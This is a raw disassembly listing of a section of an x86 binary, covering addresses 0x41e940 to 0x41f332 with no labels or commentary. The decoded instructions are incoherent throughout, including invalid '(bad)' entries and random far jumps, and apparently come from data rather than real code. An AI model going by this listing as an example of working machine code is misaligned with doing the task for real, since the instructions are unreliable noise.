  41e940:	lods   eax,DWORD PTR ds:[esi]
  41e941:	cmp    BYTE PTR [esi],bl
  41e943:	mov    ds:0x2b703d1,al
  41e948:	mov    al,0xdc
  41e94a:	or     BYTE PTR [edx],0x67
  41e94d:	sub    al,0x69
  41e94f:	sub    DWORD PTR [edi],ebx
  41e951:	sub    ebx,edx
  41e953:	inc    edi
  41e954:	into   
  41e955:	test   DWORD PTR [eax+0x64f06fc8],eax
  41e95b:	shl    DWORD PTR [eax-0xe929276],cl
  41e961:	enter  0x973d,0xcc
  41e965:	add    BYTE PTR [edi+ebx*4],bh
  41e968:	push   esp
  41e969:	aad    0x23
  41e96b:	fsub   QWORD PTR [ebx]
  41e96d:	jecxz  0x41e917
  41e96f:	sbb    al,0x82
  41e972:	cmovns ebx,DWORD PTR [edi+edi*2+0x3d156378]
  41e97a:	jns    0x41e935
  41e97c:	ret    0xb17
  41e97f:	loopne 0x41e939
  41e981:	scas   al,BYTE PTR es:[edi]
  41e982:	test   BYTE PTR [ecx+esi*2-0x67],bh
  41e986:	push   ds
  41e987:	pop    edx
  41e988:	cli    
  41e989:	sbb    al,0xa8
  41e98b:	rol    BYTE PTR [esi+eax*2+0x19],cl
  41e98f:	xor    ah,BYTE PTR [eax+eax*1+0x0]
	...
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	std    
  41ea01:	add    DWORD PTR [eax],ecx
  41ea03:	cmp    BYTE PTR [esi],dl
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x9e000001
  41ea0d:	xor    BYTE PTR [ecx-0x5f],ah
  41ea10:	inc    ebp
  41ea11:	inc    esp
  41ea12:	sbb    bh,BYTE PTR [ebx]
  41ea14:	adc    bh,BYTE PTR [esi-0x7]
  41ea17:	out    0xfd,al
  41ea19:	jge    0x41ea35
  41ea1b:	ss clc 
  41ea1d:	rcr    DWORD PTR [ecx-0x4a9f0b57],0x73
  41ea24:	into   
  41ea25:	mov    dl,0x5f
  41ea27:	add    bl,BYTE PTR [ebp+0x494bb851]
  41ea2d:	xchg   esi,eax
  41ea2e:	fidiv  DWORD PTR [ebp-0x25f83bb0]
  41ea34:	std    
  41ea35:	ss sub al,0x60
  41ea38:	adc    BYTE PTR [esi+0x5d],dh
  41ea3b:	mov    esp,0x11898350
  41ea40:	pushf  
  41ea41:	and    BYTE PTR ds:0x6ff3d0de,ch
  41ea47:	add    eax,0xa4234a15
  41ea4c:	dec    ecx
  41ea4d:	sub    BYTE PTR [esi],bh
  41ea4f:	stos   BYTE PTR es:[edi],al
  41ea50:	idiv   BYTE PTR [ebx-0x22]
  41ea53:	in     eax,dx
  41ea54:	and    BYTE PTR ds:0xe7b4ce91,0xd6
  41ea5b:	and    bh,ch
  41ea5d:	sbb    ebp,DWORD PTR [eax-0x7db090fc]
  41ea63:	jl     0x41ea5c
  41ea65:	and    dh,dh
  41ea67:	or     DWORD PTR [ebp-0x3d4fac07],0x31
  41ea6e:	outs   dx,DWORD PTR ds:[esi]
  41ea6f:	or     BYTE PTR [esi+eax*2],bh
  41ea72:	in     al,dx
  41ea73:	cmp    eax,0x90cde0c2
  41ea78:	retf   
  41ea79:	idiv   BYTE PTR [edi]
  41ea7b:	jns    0x41ea1a
  41ea7d:	mov    DWORD PTR [eax],ebx
  41ea7f:	arpl   dx,bx
  41ea81:	out    0x17,eax
  41ea83:	sbb    edx,DWORD PTR [eax-0xf0da721]
  41ea89:	adc    BYTE PTR [ebp+0x7d5ed29],al
  41ea8f:	dec    esi
  41ea90:	icebp  
  41ea91:	push   eax
  41ea93:	mov    BYTE PTR [ecx-0x29],bl
  41ea96:	mov    BYTE PTR [esi+0x64],al
  41ea99:	cmp    eax,0xbc72b928
  41ea9e:	dec    esp
  41ea9f:	mov    cl,0x24
  41eaa1:	scas   al,BYTE PTR es:[edi]
  41eaa2:	or     esi,DWORD PTR [edx]
  41eaa4:	adc    edi,DWORD PTR [esi+0x266dcc83]
  41eaaa:	or     bl,BYTE PTR [eax+0x5b]
  41eaad:	adc    bh,BYTE PTR [eax+0x7e]
  41eab0:	js     0x41eae7
  41eab2:	pop    esi
  41eab3:	cdq    
  41eab4:	cmp    al,0x1e
  41eab6:	shl    bh,1
  41eab8:	pop    ss
  41eab9:	dec    esi
  41eaba:	not    DWORD PTR [esi]
  41eabc:	stc    
  41eabd:	inc    ebp
  41eabe:	mov    ss,WORD PTR [ecx+0x47]
  41eac1:	jge    0x41eadf
  41eac3:	and    BYTE PTR [edi],cl
  41eac5:	into   
  41eac6:	mov    ds:0xb9738e7f,eax
  41eacb:	add    ecx,DWORD PTR [edx]
  41eacd:	cld    
  41eace:	test   eax,0x3c452c2
  41ead3:	push   edx
  41ead4:	bound  eax,QWORD PTR [edi-0x76]
  41ead7:	gs jbe 0x41ea8b
  41eada:	ret    
  41eadb:	(bad)  
  41eadc:	loopne 0x41ead4
  41eade:	fdiv   QWORD PTR [ecx]
  41eae0:	cdq    
  41eae1:	dec    edi
  41eae2:	adc    ebx,DWORD PTR [edx]
  41eae4:	retf   0x1a23
  41eae7:	xor    BYTE PTR [edx-0x7e],dh
  41eaea:	call   0x9aa8:0xbfaea1b
  41eaf1:	outs   dx,BYTE PTR ds:[esi]
  41eaf2:	outs   dx,DWORD PTR ds:[esi]
  41eaf3:	outs   dx,DWORD PTR ds:[esi]
  41eaf4:	lds    eax,FWORD PTR [edx]
  41eaf6:	xchg   ebx,eax
  41eaf7:	mov    al,0x74
  41eaf9:	gs fwait
  41eafb:	mov    WORD PTR ds:[edi],ds
  41eafe:	addr16 pop edx
  41eb00:	cmc    
  41eb01:	loopne 0x41ea9f
  41eb03:	xchg   edi,eax
  41eb04:	push   es
  41eb05:	shl    DWORD PTR [ecx],cl
  41eb07:	and    al,0xc0
  41eb09:	lods   al,BYTE PTR ds:[esi]
  41eb0a:	fsubr  DWORD PTR [esi-0x6e]
  41eb0d:	cld    
  41eb0e:	aas    
  41eb0f:	loopne 0x41eadc
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x54
  41eb81:	xor    BYTE PTR [edx-0x6b],cl
  41eb84:	sbb    eax,DWORD PTR [edi+0x1]
  41eb87:	add    BYTE PTR ds:0x44000001,al
  41eb8d:	sbb    BYTE PTR [eax+edx*4+0x51098f45],0x41
  41eb95:	sbb    BYTE PTR [edx],cl
  41eb97:	scas   eax,DWORD PTR es:[edi]
  41eb98:	(bad)  [edi]
  41eb9a:	mov    edx,0x5cd0807
  41eb9f:	cmp    al,0xae
  41eba1:	jo     0x41eba8
  41eba3:	ins    BYTE PTR es:[edi],dx
  41eba4:	pminub mm4,QWORD PTR [eax-0x4d6db836]
  41ebab:	outs   dx,BYTE PTR ds:[esi]
  41ebac:	pop    edi
  41ebad:	xchg   BYTE PTR [edx],al
  41ebaf:	sub    BYTE PTR [ebx],0x68
  41ebb2:	cmp    cl,BYTE PTR [ebx]
  41ebb4:	cld    
  41ebb5:	dec    ebp
  41ebb6:	cli    
  41ebb7:	cmp    DWORD PTR [edx+0x22800ee3],ecx
  41ebbd:	loope  0x41ebd6
  41ebbf:	cdq    
  41ebc0:	cmp    ebx,DWORD PTR [edx]
  41ebc2:	popa   
  41ebc3:	xlat   BYTE PTR ds:[ebx]
  41ebc4:	and    eax,0x5ec172b1
  41ebc9:	leave  
  41ebca:	call   0x4372:0x2c9fcc2a
  41ebd1:	int3   
  41ebd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebd3:	inc    edi
  41ebd4:	sahf   
  41ebd5:	stos   DWORD PTR es:[edi],eax
  41ebd6:	and    BYTE PTR [esi+0x7d708163],ah
  41ebdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebdd:	push   es
  41ebde:	aaa    
  41ebdf:	out    0x3c,al
  41ebe1:	mov    al,0xdf
  41ebe3:	and    BYTE PTR [esi],ch
  41ebe5:	xor    al,0xe2
  41ebe7:	sahf   
  41ebe8:	test   eax,0xbb36321
  41ebed:	pop    edi
  41ebee:	jecxz  0x41ec28
  41ebf0:	(bad)  
  41ebf1:	in     al,0x12
  41ebf3:	push   ds
  41ebf4:	pop    ecx
  41ebf5:	mov    ch,0x63
  41ebf7:	retf   0x9fe7
  41ebfa:	je     0x41ec48
  41ebfc:	push   0xf1f76369
  41ec01:	pop    DWORD PTR ds:0x87c90bce
  41ec07:	push   ss
  41ec08:	xchg   ebx,eax
  41ec09:	aam    0x51
  41ec0b:	lods   al,BYTE PTR ds:[esi]
  41ec0c:	nop
  41ec0d:	ins    BYTE PTR es:[edi],dx
  41ec0e:	aam    0xe0
  41ec10:	pop    ebp
  41ec11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec12:	pop    ds
  41ec13:	in     al,0x50
  41ec15:	fisttp QWORD PTR [edi]
  41ec17:	mov    edx,0x7ba684f1
  41ec1c:	pop    esp
  41ec1d:	and    edx,edi
  41ec1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec20:	mov    edx,0xd36a766b
  41ec25:	add    al,BYTE PTR [esp+ebx*2+0x44df8db]
  41ec2c:	mov    bh,0x9d
  41ec2e:	cmp    eax,0x8ae2aaa8
  41ec33:	xor    al,0x47
  41ec35:	or     BYTE PTR [edx+edi*4-0x322bbf04],bh
  41ec3c:	inc    edx
  41ec3d:	das    
  41ec3e:	jecxz  0x41ec2a
  41ec40:	out    dx,al
  41ec41:	adc    bh,ah
  41ec43:	cmp    eax,0x87000b99
  41ec48:	or     al,ch
  41ec4a:	or     BYTE PTR [esi],0xa0
  41ec4d:	sub    DWORD PTR [edx-0x6c65637d],ecx
  41ec53:	xor    ah,BYTE PTR [ecx]
  41ec55:	mov    eax,DWORD PTR [ecx+0x7]
  41ec58:	daa    
  41ec59:	add    ecx,DWORD PTR [esi-0x11]
  41ec5c:	xchg   esp,eax
  41ec5d:	ret    0x845d
  41ec60:	lock lea ebp,[eax]
  41ec63:	cmp    BYTE PTR [edx],ch
  41ec65:	xchg   edi,eax
  41ec66:	icebp  
  41ec67:	inc    eax
  41ec68:	pop    ecx
  41ec69:	jno    0x41ec0d
  41ec6b:	jmp    0x41ec1c
  41ec6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec6f:	push   eax
  41ec70:	inc    edi
  41ec71:	cmp    DWORD PTR [eax],esp
  41ec73:	cmp    ah,bl
  41ec75:	fnstenv [eax+edi*2+0x523e5dbf]
  41ec7c:	stc    
  41ec7d:	jo     0x41eced
  41ec7f:	pushf  
  41ec80:	xchg   esp,eax
  41ec81:	xchg   edi,eax
  41ec82:	mov    edi,DWORD PTR cs:[ecx]
  41ec85:	push   esp
  41ec86:	call   0x23248b07
  41ec8b:	inc    edi
  41ec8c:	mov    edi,0x3f76e075
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x97ae5fd0
  41ed02:	stos   BYTE PTR es:[edi],al
  41ed03:	adc    esp,DWORD PTR [eax]
  41ed05:	dec    eax
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    eax,0x81000001
  41ed0d:	push   ebx
  41ed0e:	sbb    al,0xfb
  41ed10:	adc    esp,DWORD PTR [ebx]
  41ed12:	push   0xa2acf0b5
  41ed17:	jge    0x41ed5e
  41ed19:	push   es
  41ed1a:	das    
  41ed1b:	xchg   BYTE PTR [ecx+0x6b705ffc],al
  41ed21:	pop    edi
  41ed22:	mov    ?,ebx
  41ed24:	dec    ecx
  41ed25:	pop    edx
  41ed26:	in     eax,0x29
  41ed28:	in     al,dx
  41ed29:	lock lods eax,DWORD PTR fs:[esi]
  41ed2c:	je     0x41ecbb
  41ed2e:	aas    
  41ed2f:	jb     0x41ed03
  41ed31:	xor    esi,DWORD PTR [ebx+0x3e]
  41ed34:	xchg   edx,eax
  41ed35:	xchg   esi,eax
  41ed36:	jecxz  0x41ed42
  41ed38:	jno    0x41ecbb
  41ed3a:	cmp    ebx,edi
  41ed3c:	je     0x41ed0f
  41ed3e:	cli    
  41ed3f:	dec    edx
  41ed40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed41:	das    
  41ed42:	pop    eax
  41ed43:	nop
  41ed44:	adc    DWORD PTR [esi+0x63585fc9],esp
  41ed4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed4b:	into   
  41ed4c:	push   eax
  41ed4d:	repnz pushf 
  41ed4f:	mov    esp,0xaf6432d0
  41ed54:	inc    edx
  41ed55:	pushf  
  41ed56:	shl    edi,cl
  41ed58:	cdq    
  41ed59:	pop    eax
  41ed5a:	mov    ah,0xdb
  41ed5c:	pop    es
  41ed5d:	inc    ebx
  41ed5e:	clc    
  41ed5f:	shl    BYTE PTR [edi+0xa],cl
  41ed62:	iret   
  41ed63:	mov    cs,WORD PTR [esi]
  41ed65:	pop    ebp
  41ed66:	jo     0x41edb1
  41ed68:	sub    ecx,0x46bc0e47
  41ed6e:	jl     0x41ed98
  41ed70:	test   al,0x4e
  41ed72:	lahf   
  41ed73:	sbb    BYTE PTR [ebx+0x4c],al
  41ed76:	in     eax,0xdd
  41ed78:	and    ebx,DWORD PTR [ecx-0x57a720fc]
  41ed7e:	ins    DWORD PTR es:[edi],dx
  41ed7f:	jmp    0x5da1:0xa40ff663
  41ed86:	ficom  WORD PTR [edi]
  41ed88:	mov    ds:0xcb5dcd0a,eax
  41ed8d:	mov    edi,0x6a1de677
  41ed92:	(bad)  
  41ed93:	adc    esi,DWORD PTR [edx-0x60]
  41ed96:	jns    0x41ed9f
  41ed98:	in     al,0xe8
  41ed9a:	aas    
  41ed9b:	xor    al,0x3e
  41ed9d:	int3   
  41ed9e:	(bad)  
  41ed9f:	jmp    0xe19f:0x9c6c4cd
  41eda6:	dec    edx
  41eda7:	lods   eax,DWORD PTR ds:[esi]
  41eda8:	lds    ebx,FWORD PTR [ebx-0x1bcc70b1]
  41edae:	shl    BYTE PTR [ebx+ebx*4],cl
  41edb1:	js     0x41edd5
  41edb3:	mov    ecx,esi
  41edb5:	or     bh,BYTE PTR [eax]
  41edb7:	mov    bl,0xb9
  41edb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edba:	test   eax,0xb8375847
  41edbf:	xchg   edx,eax
  41edc0:	jg     0x41ee1f
  41edc2:	hlt    
  41edc3:	rol    DWORD PTR [edx+0x1296e7de],cl
  41edc9:	push   cs
  41edca:	aas    
  41edcb:	test   al,0xb2
  41edcd:	aam    0x7a
  41edcf:	adc    DWORD PTR [ebx+eax*2+0x22],edx
  41edd3:	jmp    0x41ee18
  41edd5:	sahf   
  41edd6:	dec    edi
  41edd7:	dec    edx
  41edd8:	js     0x41ee45
  41edda:	or     eax,0xc3b0a0ab
  41eddf:	xchg   esp,eax
  41ede0:	jnp    0x41ee3b
  41ede2:	adc    edx,DWORD PTR [ebx+ebx*8]
  41ede5:	sahf   
  41ede6:	jmp    0x23ed:0x3ae653f3
  41eded:	add    DWORD PTR [edi+0x1acf7d4b],eax
  41edf3:	pop    esp
  41edf4:	cli    
  41edf5:	rol    bl,cl
  41edf7:	add    al,0x7f
  41edf9:	push   0x7
  41edfb:	sub    ah,BYTE PTR [ebp+0x21fbd0ec]
  41ee01:	fidivr WORD PTR [ecx-0x25]
  41ee04:	test   BYTE PTR [ebx],ah
  41ee06:	call   0x64056a17
  41ee0b:	jl     0x41ee74
  41ee0d:	iret   
  41ee0e:	inc    esi
  41ee0f:	cwde   
  41ee10:	pop    ebx
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x258f:0xf9ce5ce7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x18000001
  41ee8d:	das    
  41ee8e:	bound  ebp,QWORD PTR [ebx]
  41ee90:	fild   DWORD PTR [esi+0x60df3f0]
  41ee96:	sbb    al,0xa7
  41ee98:	into   
  41ee99:	mov    ch,0x39
  41ee9b:	push   ebp
  41ee9c:	pop    edi
  41ee9d:	xor    esi,DWORD PTR [esi-0x4]
  41eea0:	xbegin 0xbfbe4d70
  41eea6:	stc    
  41eea7:	jmp    0x2242:0x8e067899
  41eeae:	mov    esi,0xa7b87add
  41eeb3:	mov    bl,0x2b
  41eeb5:	adc    al,0x44
  41eeb7:	pop    ds
  41eeb8:	jmp    0x2b0b:0x7b7e2cb3
  41eebf:	call   0xbcd8:0x53e61b38
  41eec6:	mov    ch,0x6f
  41eec8:	inc    eax
  41eec9:	add    dl,BYTE PTR ds:0x4fa38b31
  41eecf:	fnsave [ecx-0x289f3fc9]
  41eed5:	jge    0x41ee91
  41eed7:	dec    eax
  41eed8:	mov    ebp,0x5917968a
  41eedd:	push   edx
  41eede:	cmc    
  41eedf:	jns    0x41eed2
  41eee1:	in     al,0x3d
  41eee3:	imul   ebp,DWORD PTR [edx-0x19],0x20
  41eee7:	push   es
  41eee8:	jmp    0x7180:0xf2f516ca
  41eeef:	mov    esi,0x38a5492e
  41eef4:	retf   
  41eef5:	outs   dx,DWORD PTR ds:[esi]
  41eef6:	lods   al,BYTE PTR ds:[esi]
  41eef7:	imul   eax,DWORD PTR [edi+0x4f2b2cbd],0xb24ca924
  41ef01:	les    edi,FWORD PTR [ebx]
  41ef03:	ins    BYTE PTR es:[edi],dx
  41ef04:	xor    al,0x97
  41ef06:	push   edx
  41ef07:	stc    
  41ef08:	(bad)  
  41ef0a:	cs cmc 
  41ef0c:	fst    QWORD PTR [ebx-0x3c]
  41ef0f:	int3   
  41ef10:	(bad)  
  41ef11:	test   DWORD PTR [edx-0x3c],0xf076f770
  41ef18:	ins    BYTE PTR es:[edi],dx
  41ef19:	inc    ebp
  41ef1a:	ror    bh,1
  41ef1c:	jb     0x41eef4
  41ef1e:	xchg   ecx,eax
  41ef1f:	repnz test BYTE PTR [edi],cl
  41ef22:	ss fs enter 0xec2e,0xef
  41ef28:	and    eax,0x146e6
  41ef2d:	aas    
  41ef2e:	xchg   DWORD PTR [edi+eax*2+0x30],esp
  41ef32:	mov    ds,WORD PTR [ecx+ebx*2]
  41ef35:	mov    esi,0x33364328
  41ef3a:	jno    0x41ef12
  41ef3c:	mov    edx,0xac926bc7
  41ef41:	mov    al,0xe3
  41ef43:	fcomp  QWORD PTR [eax]
  41ef45:	mov    ebx,0xeb96e3d2
  41ef4a:	in     eax,0xb6
  41ef4c:	scas   al,BYTE PTR es:[edi]
  41ef4d:	fwait
  41ef4e:	and    BYTE PTR [edx-0x631d5792],bh
  41ef54:	sub    ah,BYTE PTR [eax+0x23cc8576]
  41ef5a:	pop    ebp
  41ef5b:	imul   edi,DWORD PTR [edx+0x7c],0x6c82c07a
  41ef62:	sub    esp,ebp
  41ef64:	aas    
  41ef65:	call   0xb683:0xf619195
  41ef6c:	jmp    0xee74:0x1c965d20
  41ef73:	dec    esp
  41ef74:	in     eax,dx
  41ef75:	mov    fs,WORD PTR [edi+0x4ab0293a]
  41ef7b:	xchg   edx,eax
  41ef7c:	shr    ecx,1
  41ef7e:	outs   dx,DWORD PTR ds:[esi]
  41ef7f:	jmp    0x41efad
  41ef81:	cld    
  41ef82:	xor    eax,0x4dfad02a
  41ef87:	imul   edi,DWORD PTR [eax-0x5b1518ff],0x40
  41ef8e:	sub    BYTE PTR [edx],bh
  41ef90:	and    DWORD PTR [eax],eax
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul esi,DWORD PTR [ecx-0x3b],0x6b
  41f003:	aam    0x2a
  41f005:	dec    edx
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0xf000001
  41f00d:	sar    DWORD PTR [edx],cl
  41f00f:	xor    al,0x9a
  41f011:	or     eax,0xda24435
  41f016:	pop    eax
  41f017:	popa   
  41f018:	(bad)  
  41f019:	mov    ah,0xba
  41f01b:	or     BYTE PTR [eax],dh
  41f01d:	pop    ecx
  41f01e:	mov    BYTE PTR [edi],dl
  41f020:	sub    BYTE PTR [eax+0x4f],0x65
  41f024:	jle    0x41f068
  41f026:	out    0x1f,eax
  41f028:	leave  
  41f029:	fnstcw WORD PTR [edx+0x4474c28c]
  41f02f:	cld    
  41f030:	push   ds
  41f031:	pop    ebx
  41f032:	xor    DWORD PTR [esi+eax*2-0x12],ebx
  41f036:	fist   WORD PTR [edi-0x7b]
  41f039:	mov    edx,0xbd827e8
  41f03e:	mov    ds:0x820cd684,al
  41f043:	leave  
  41f044:	dec    ebx
  41f045:	cmp    BYTE PTR fs:[edx-0x7c],0x82
  41f04a:	sahf   
  41f04b:	test   eax,0x354465fb
  41f051:	leave  
  41f052:	es mov ah,0x84
  41f055:	jmp    0xdd4d063b
  41f05a:	fld    DWORD PTR [edx+0x4d941282]
  41f060:	rol    BYTE PTR [ebx+0x6cda8f9c],0xe
  41f067:	sbb    al,0x2c
  41f069:	push   ebp
  41f06a:	dec    edx
  41f06b:	jne    0x41efff
  41f06d:	jo     0x41f0ed
  41f06f:	jnp    0x41f0d2
  41f071:	mov    bl,0xcb
  41f073:	mov    edi,0xe01408e2
  41f078:	shr    BYTE PTR [esi+0x6f],1
  41f07b:	or     DWORD PTR [ebp+0x42],ebx
  41f07e:	mov    ah,0xfe
  41f080:	mov    ss,WORD PTR [esi+0x51]
  41f083:	fstp   DWORD PTR [esi-0x4d]
  41f086:	fucomi st,st(0)
  41f088:	mov    eax,0x33c9f439
  41f08d:	xchg   ebx,eax
  41f08e:	mov    eax,0x7062721f
  41f093:	aam    0x67
  41f095:	ret    0xc2e7
  41f098:	xchg   ebx,eax
  41f099:	mov    cl,0x64
  41f09b:	lds    esi,FWORD PTR [ebx*1-0x5b985149]
  41f0a2:	adc    eax,0x3f3c9337
  41f0a7:	cmp    cl,BYTE PTR [ecx+0x32]
  41f0aa:	xchg   ebx,eax
  41f0ab:	dec    eax
  41f0ac:	pop    eax
  41f0ad:	mov    eax,ds:0x2cfc1383
  41f0b2:	xchg   ecx,eax
  41f0b3:	or     al,0x6f
  41f0b5:	out    0xd8,eax
  41f0b7:	fnsave [ebp+0x19]
  41f0ba:	and    al,0xf4
  41f0bc:	jp     0x41f0f0
  41f0be:	pop    esp
  41f0bf:	inc    eax
  41f0c0:	push   0x37
  41f0c2:	sahf   
  41f0c3:	xor    BYTE PTR [ebx-0xa],cl
  41f0c6:	mov    esi,0xf5826398
  41f0cb:	enter  0xab40,0xdb
  41f0cf:	call   0x203d:0xddffdb0a
  41f0d6:	xor    esi,eax
  41f0d8:	jmp    0x8d22:0x818a6519
  41f0df:	dec    ebp
  41f0e0:	mov    ecx,0xde035d38
  41f0e5:	sar    DWORD PTR [eax],1
  41f0e7:	icebp  
  41f0e8:	ss cdq 
  41f0ea:	sbb    al,0x89
  41f0ec:	jns    0x41f0c4
  41f0ee:	add    al,0xab
  41f0f0:	loopne 0x41f103
  41f0f2:	mov    esi,0x7979ebd9
  41f0f7:	xchg   esi,eax
  41f0f8:	in     al,0x9a
  41f0fa:	jno    0x41f172
  41f0fc:	aam    0x53
  41f0fe:	adc    al,0x71
  41f100:	int3   
  41f101:	inc    ebx
  41f102:	inc    edx
  41f103:	sti    
  41f104:	add    BYTE PTR [edx],al
  41f106:	ja     0x41f0d9
  41f108:	or     esi,ebx
  41f10a:	cmp    eax,0xa3f33f87
  41f10f:	push   esi
  41f110:	test   BYTE PTR [eax],0x0
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0xae6182a5
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0x86000001
  41f18d:	add    eax,0x676a94b4
  41f192:	mov    dl,0xe5
  41f194:	hlt    
  41f195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f196:	rcr    edi,0xf8
  41f199:	repz push eax
  41f19b:	test   eax,0x828d64a8
  41f1a0:	repnz pop ebp
  41f1a2:	pop    ds
  41f1a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1a4:	add    BYTE PTR [esi+esi*8],ah
  41f1a7:	mov    edx,0x8e851231
  41f1ac:	loope  0x41f213
  41f1ae:	dec    esp
  41f1af:	mov    esp,0x5d678211
  41f1b4:	xchg   edi,eax
  41f1b5:	cmp    esp,DWORD PTR [ebx]
  41f1b7:	push   esi
  41f1b8:	sbb    bh,BYTE PTR [eax+0x6d]
  41f1bb:	xor    esi,DWORD PTR [edx-0x3a]
  41f1be:	jo     0x41f18a
  41f1c0:	add    ah,bl
  41f1c2:	imul   esp,DWORD PTR [ecx],0x2aa3209
  41f1c8:	jmp    0xb23c:0x6d35c542
  41f1cf:	fbld   TBYTE PTR [edx]
  41f1d1:	mov    dl,0x43
  41f1d3:	dec    edx
  41f1d4:	xor    edx,DWORD PTR [eax-0x1b]
  41f1d7:	mov    ebx,ds
  41f1d9:	aam    0x72
  41f1db:	jle    0x41f18e
  41f1dd:	jmp    0x7e8f:0xef1af22f
  41f1e4:	xchg   edx,eax
  41f1e5:	pop    ecx
  41f1e6:	cld    
  41f1e7:	inc    edi
  41f1e8:	into   
  41f1e9:	enter  0xa79a,0xa2
  41f1ed:	ins    BYTE PTR es:[edi],dx
  41f1ee:	in     al,dx
  41f1ef:	test   BYTE PTR fs:[esi+0x3fb6d8b7],cl
  41f1f6:	sbb    BYTE PTR [edx+0x3b],ch
  41f1f9:	sbb    bh,al
  41f1fb:	lea    eax,[eax]
  41f1fd:	mov    DWORD PTR [ebx],ebp
  41f1ff:	jecxz  0x41f195
  41f201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f202:	sahf   
  41f203:	lea    edi,[ecx+ebx*8]
  41f206:	hlt    
  41f207:	stos   BYTE PTR es:[edi],al
  41f208:	or     eax,0x7f91e618
  41f20d:	pop    ss
  41f20e:	or     DWORD PTR [edi],esp
  41f210:	int    0x1a
  41f212:	jae    0x41f1d0
  41f214:	add    esp,DWORD PTR [edx+0x7a]
  41f217:	mov    ebp,0xc706781
  41f21c:	push   ss
  41f21d:	repnz dec ecx
  41f21f:	mov    ebp,0x5f8c243a
  41f224:	mov    esp,DWORD PTR [edi+0x62]
  41f227:	cmp    DWORD PTR [edi+edx*1],esi
  41f22a:	dec    edx
  41f22b:	imul   esp,DWORD PTR [eax],0x1bf9ccb3
  41f231:	rcl    DWORD PTR [edx-0x3774fb6d],1
  41f237:	sahf   
  41f238:	sub    esp,esi
  41f23a:	cmp    esi,DWORD PTR ds:0x85364994
  41f240:	and    DWORD PTR [ebp+0xe],esp
  41f243:	cmp    DWORD PTR [ebx],ebx
  41f245:	inc    esi
  41f246:	addr16 aaa 
  41f248:	jg     0x41f243
  41f24a:	push   cs
  41f24b:	popa   
  41f24c:	out    0xfa,al
  41f24e:	and    eax,0x795fd57
  41f253:	outs   dx,DWORD PTR ds:[esi]
  41f254:	or     DWORD PTR es:[eax],edx
  41f257:	dec    ebp
  41f258:	cmp    al,0x82
  41f25a:	mov    edi,gs
  41f25c:	ret    0x3c11
  41f25f:	mov    dh,dh
  41f261:	mov    cl,0x29
  41f263:	jb     0x41f215
  41f265:	sub    bl,bl
  41f267:	out    dx,eax
  41f268:	je     0x41f26b
  41f26a:	js     0x41f245
  41f26c:	fdivr  DWORD PTR [esi-0x5f]
  41f26f:	mov    esi,0x65f8f3ef
  41f274:	loopne 0x41f2de
  41f276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f277:	scas   eax,DWORD PTR es:[edi]
  41f278:	(bad)  
  41f279:	stos   BYTE PTR es:[edi],al
  41f27a:	inc    esp
  41f27b:	stos   DWORD PTR es:[edi],eax
  41f27c:	mov    edi,0x4ef85c65
  41f281:	fistp  QWORD PTR [edi+0x76]
  41f284:	mov    esi,0x9c73539a
  41f289:	and    DWORD PTR [ebp+0x704a9b96],edx
  41f28f:	hlt    
  41f290:	push   esi
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f32a
  41f301:	and    al,0xeb
  41f303:	xchg   ebp,eax
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0xdd000001
  41f30d:	sbb    dl,BYTE PTR [esi-0x725d6eff]
  41f313:	cwde   
  41f314:	fwait
  41f315:	pop    edi
  41f316:	loopne 0x41f304
  41f318:	inc    eax
  41f319:	cmc    
  41f31a:	not    DWORD PTR [edi+0x45581207]
  41f320:	add    cl,BYTE PTR [ebx-0x29e59711]
  41f326:	data16 adc al,0x77
  41f329:	xchg   BYTE PTR [eax+0x5accad81],ch
  41f32f:	adc    BYTE PTR [ebp+0x3c],dh
  41f332:	xor    al,0x6d
